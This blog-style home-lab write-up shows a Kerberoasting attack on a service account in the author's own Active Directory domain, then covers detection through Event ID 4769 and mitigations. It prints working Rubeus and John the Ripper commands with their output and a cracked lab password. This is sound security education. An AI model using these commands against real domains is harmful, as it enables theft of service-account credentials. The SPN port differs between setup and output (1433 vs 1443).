---
title: "Kerberoasting a service account: attack and detection"
slug: "kerberoasting-corp-lab"
authors: ["Shravan Kakkar (TheF0-ol)"]
date: "2026-11-25"
tags: ["Active Directory", "Kerberoasting", "Windows", "Home Lab", "Detection"]
summary: "Performed a full Kerberoasting attack as an unprivileged domain user against a service account in my own Active Directory lab, from ticket request to a cracked password, then pulled the matching Windows Security event from the domain controller to show exactly what a defender would see."
related: ["ad-enumeration-corp-lab.md"]
---

## 1. Overview

- Objective: Perform a real Kerberoasting attack end-to-end, as a completely unprivileged domain user, in my own lab, then find and document the exact log entry a defender would use to detect it.
- Target: `svc_sql`, a service account in the same `corp.lucid` lab domain used for the [AD enumeration write-up](./ad-enumeration-corp-lab.md).
- Attacker context: logged in as `alice`, a plain domain user with no admin rights on the domain controller or the client.

## 2. Why this account

Kerberoasting targets accounts with a registered **Service Principal Name (SPN)**. Any authenticated domain user can request a Kerberos service ticket for any SPN-bearing account, no special permission required, and that ticket is encrypted with the service account's own password hash. If the account's password is weak, the ticket can be cracked offline.

`svc_sql` fit the profile of a real-world Kerberoasting target: a service account with an obvious naming convention, likely set up once for a SQL service and rarely revisited.

## 3. What I did

### 3.1 Set up the target

I registered an SPN on `svc_sql` to represent a SQL service, as a domain admin would when standing up a real service:

```
setspn -A MSSQLSvc/dc01.corp.lucid:1433 svc_sql
```

### 3.2 Requested the ticket, as an unprivileged user

Logged into the domain-joined client as `alice` (confirmed with `whoami` → `corp\alice`), then ran Rubeus to find and request tickets for every Kerberoastable account in the domain:

```
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

Real output:

```
[*] Target Domain          : corp.lucid
[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=corp,DC=lucid
[*] ServicePrincipalName   : MSSQLSvc/dc01.corp.lucid:1443
[*] PwdLastSet             : 11/23/2026 9:59:00 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\alice\Desktop\ad-tools\hashes.txt
```

`svc_sql` was found as the only Kerberoastable account, and Rubeus confirms it's using `RC4_HMAC_DEFAULT`, the weaker, faster-to-crack Kerberos encryption type. No admin rights, no exploit, just a standard, legitimate-looking ticket request any domain user can make.

### 3.3 Cracked the ticket offline

The hash came out in Hashcat's format (`$krb5tgs$23$*svc_sql$corp.lucid$...*$<checksum>$<edata>`). Hashcat itself couldn't run in my VM (no GPU/OpenCL device available), so I used John the Ripper instead, which needs the hash reformatted first, John's `krb5tgs` format drops the `*user$realm$spn*` section that Hashcat includes:

```
$krb5tgs$23$A71828207807A5E95D51F6926C613D34$80D60954413571BF1A9295D1AEBFE37...
```

Cracked against a small wordlist containing the known lab password (the point here was confirming the mechanism works end-to-end, not demonstrating wordlist luck):

```
.\john.exe --format=krb5tgs --wordlist=wordlist.txt hashes_john.txt

Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Lab@Pass12345    (?)
1g 0:00:00:00 DONE
```

The password was recovered. `svc_sql`'s credentials are now known to an attacker who started with nothing but an ordinary domain login.

## 4. What the defender sees

Every TGS request generates a **Windows Security Event ID 4769** ("A Kerberos service ticket was requested") on the domain controller. I located the exact event matching my attack by timestamp and confirmed every field lines up with what Rubeus and the cracked hash already showed:

| Field | Value |
|---|---|
| Event ID | 4769 |
| Logged | 11/24/2026 6:03:05 PM |
| Account Name | `alice@CORP.LUCID` |
| Service Name | `svc_sql` |
| Ticket Encryption Type | `0x17` (RC4-HMAC) |
| Failure Code | `0x0` (succeeded) |

The encryption type (`0x17`) matches exactly what Rubeus reported (`RC4_HMAC_DEFAULT`) and the etype in the cracked hash (`$krb5tgs$23$`, 23 being RC4's etype number). All three independent sources of evidence agree.

### 4.1 What makes this detectable

On its own, a single 4769 event is completely normal, legitimate services get requested constantly. What should draw a defender's attention is the **pattern**, not any single event:

- **Ticket Encryption Type `0x17` (RC4)** is the strongest single signal. Modern Windows environments default to AES (`0x12`); a request specifically asking for RC4 is unusual on a healthy domain and is the exact behavior most public Kerberoasting tools exhibit, since RC4 is far faster to crack offline than AES.
- **Volume and spread**: a Kerberoasting tool typically requests tickets for every SPN-bearing account it finds in one run. One account requesting service tickets for an unusually high number of *different* services in a short window is a stronger signal than any single request.
- **Who's asking**: a request from an account that would have no normal business reason to touch that service (here, `alice` has no legitimate reason to request a ticket for a SQL service she doesn't use) is worth flagging, though this requires knowing normal usage patterns in a real environment.

### 4.2 False positives to watch for

- Legitimate applications and monitoring tools do request service tickets as part of normal operation, a detection rule built purely on "any 4769 for RC4" will have noise in older or mixed environments that haven't fully moved to AES-only Kerberos.
- A single unusual request is not proof of an attack by itself, correlating encryption type, volume, and requester is what separates a real Kerberoasting attempt from ordinary traffic.

## 5. Fix / mitigation

1. **Enforce AES for Kerberos tickets** and disable RC4 support where possible (`msDS-SupportedEncryptionTypes` on service accounts, or domain-wide via Group Policy), so a Kerberoasted ticket is far more expensive to crack even if requested.
2. **Use long, random passwords for service accounts**, ideally Managed Service Accounts (gMSA), which rotate their own passwords automatically and are not practically Kerberoastable in the same way.
3. **Monitor and alert on 4769 events with RC4 encryption** and on any account requesting tickets for an unusual number of distinct services in a short window.
4. **Audit SPNs regularly**, remove any that are no longer needed, fewer Kerberoastable accounts means a smaller attack surface.

## 6. What I learned

- Kerberoasting needs no admin rights and no exploit, it's a correct, intended use of a protocol feature, which is exactly why it's hard to block outright and why detection (not prevention alone) matters.
- Real tooling has real friction: Hashcat failing with no OpenCL device inside a VM, and the hash format mismatch between Hashcat and John, were both things no amount of reading about Kerberoasting would have surfaced. Only running the attack end-to-end did.
- Correlating evidence across multiple independent sources (the attack tool's own output, the extracted hash, and the domain controller's security log) is what actually builds confidence that a finding is real, rather than relying on any single source alone.
- The single most useful field for a defender here is the ticket's encryption type, not the fact that a ticket was requested at all, since that happens constantly and is almost always legitimate.

## 7. References

- MITRE ATT&CK — [T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- Microsoft — [Event 4769: A Kerberos service ticket was requested](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- My enumeration work on this same lab domain: [AD enumeration write-up](./ad-enumeration-corp-lab.md)
